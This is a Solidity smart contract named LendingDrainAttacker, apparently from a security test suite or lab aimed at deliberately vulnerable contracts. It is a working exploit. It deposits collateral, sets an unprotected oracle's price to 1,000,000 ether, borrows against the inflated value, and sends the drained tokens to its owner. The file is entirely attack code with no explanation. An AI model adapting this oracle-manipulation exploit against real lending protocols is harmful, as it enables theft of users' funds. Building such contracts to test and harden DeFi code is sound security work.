// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../interfaces/IERC20Minimal.sol";

interface IVulnerableOracle {
    function setPrice(uint256 _price) external;
}

interface IVulnerableLendingPool {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
    function withdrawCollateral(uint256 amount) external;
    function getUserInfo(address user) external view returns (uint256 collateral, uint256 debt);
}

contract LendingDrainAttacker {
    address public owner;
    uint256 public deposited;
    uint256 public borrowedAmount;
    address public collateralToken;
    address public borrowToken;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function attack(
        address lendingPool,
        address oracle,
        address _collateralToken,
        address _borrowToken,
        uint256 depositAmount,
        uint256 _borrowAmount
    ) external onlyOwner {
        collateralToken = _collateralToken;
        borrowToken = _borrowToken;

        IERC20Minimal collateral = IERC20Minimal(_collateralToken);
        collateral.approve(lendingPool, depositAmount);
        IVulnerableLendingPool(lendingPool).depositCollateral(depositAmount);
        deposited = depositAmount;

        IVulnerableOracle(oracle).setPrice(1_000_000 ether);

        IVulnerableLendingPool(lendingPool).borrow(_borrowAmount);
        borrowedAmount = _borrowAmount;

        (uint256 coll, uint256 debt) =
            IVulnerableLendingPool(lendingPool).getUserInfo(address(this));
        require(debt > 0, "No debt");
    }

    function withdrawProfits() external onlyOwner {
        uint256 profit = IERC20Minimal(borrowToken).balanceOf(address(this));
        if (profit > 0) {
            IERC20Minimal(borrowToken).transfer(owner, profit);
        }
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(owner, amount);
    }
}
